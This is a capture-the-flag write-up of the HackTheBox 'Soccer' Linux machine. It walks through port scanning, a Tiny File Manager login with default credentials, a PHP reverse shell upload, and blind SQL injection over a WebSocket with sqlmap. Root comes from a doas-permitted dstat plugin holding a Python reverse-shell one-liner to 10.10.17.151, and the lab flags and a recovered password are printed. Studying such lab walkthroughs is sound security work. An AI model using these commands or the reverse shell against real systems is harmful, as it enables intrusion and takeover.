**Date**:2026-05-14
**Difficulty**: Easy
**OS**: Linux
**Tags**: #tiny-file-manager #file-upload #php-reverse-shell #websocket #blind-sqli #sqlmap #doas #dstat

## TL;DR 

`22/80/9091` → Tiny File Manager (default creds `admin:admin@123`) → PHP reverse shell upload as `www-data` → subdomain `soc-player` → Blind SQLi in WebSocket (port 9091) → `player:PlayerOftheMatch2022` → SSH as `player` → `doas` misconfig on `/usr/bin/dstat` → custom `dstat` plugin → `root`
## Recon

### Nmap

1. `nmap -p- soccer.htb --min-rate 5000 -T4 -oN ports.txt -v`
```
22/tcp   open  ssh  
80/tcp   open  http  
9091/tcp open  xmltec-xmlmail
```

2. `nmap -p22,80,9091 soccer.htb -sC -sV --min-rate 5000 -T4 -oN ports_detailed.txt -v`
```
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
| http-methods: 
|_  Supported Methods: GET HEAD
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
```

3. `nmap -sU --top-ports 100 soccer.htb -v`
	Nothing Interesting

## Web

+ Website has nothing clickable on its default page 
### Directory bruteforce

1. `feroxbuster -u http://soccer.htb/`
```
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg  
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg  
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg  
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg  
200      GET      147l      526w     6917c http://soccer.htb/
```
Since the default payload did not find anything interesting, I use another one!

2. `feroxbuster -u http://soccer.htb/ -w /home/0xume/Pentest/wordlists/seclists2025/Discovery/Web-Content/directory-list-2.3-medium.txt`
```
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg  
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg  
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg  
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg  
200      GET      147l      526w     6917c http://soccer.htb/  
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/  
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
```

### DMZ - Tiny File Manager

At `http://soccer.htb/tiny/` I have a tiny file manager login page with default credentials that can be easily googled: `admin:admin@123`

As an admin I can upload files, therefore I tried upload a reverse shell using one of the folder I saw before during bruteforcing: `/tiny/uploads`. Other folder are unwritable for us.

After I uploaded a default `shell.php`, I opened the file on `http:soccer.htb/tiny/uploads/shell.php` with beforehand set up nc listener,  which gave me a reverse shell.

Why is it DMZ? Because on the system I did not find anything that could help escalate privileges except for a subdomain `soc-player` in `/etc/hosts'

### Foothold - Blind SQLi in WebSocket

On `soc-player`subdomain I saw  a login page and a registration form , which I used to create a random account and login in. in a dashboard I saw different tabs and one among all was interesting for me - ticket checking system. It was using WebSocket at port **9091**, the one that was open besides 22 and 80, to send requests with ticket ids and receive requests. 

1. `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --level 5 --risk 3 --batch --dbs`
```
[05:19:13] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
```

2. `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --technique=B --level 5 --risk 3 --batch --dbms=mysql`
```
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "-1683 OR 1921=1921"}
available databases [5]:  
[*] information_schema  
[*] mysql  
[*] performance_schema  
[*] soccer_db  
[*] sys
```
3. `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --technique=B --level 5 --risk 3 --batch --dbms=mysql -D mysql -T user -C "Host,User,Password" --dump --time-sec=1`
```
[16:38:17] [INFO] retrieved: 6  
[16:38:42] [INFO] retrieved: PlayerOftheMatch2022  
[16:44:52] [INFO] retrieved: localhost
```
I tried `player:PlayerOftheMatch2022` as credentials and got the initial foothold.

```
player@soccer:~$ cat user.txt
be7d966e0e3ea3e5694220a445900afa
```
## Privilege Escalation - using doas and vulnerable

`find / -perm -4000 2>/dev/null` → `/usr/local/bin/doas`. Interesting finding because it can be used as a shell alternative.

To find its config we need to check `/usr/local/etc/doas.conf`. In my case, it allows to `/usr/bin/dstat` as a nopass root. And `dstat` is on GTFOBins with lots of potential exploration ways including reverse shell via python.

To run python we need to save `dstat_shell.py` in the `/usr/local/share/dstat/` folder.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.151",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```

And then run it as `--shell` while having a listener turned on. 
```
# cd ../../../../  
# cd root  
# cat root.txt  
4461c71db4a084808bd0611957c19b4d
```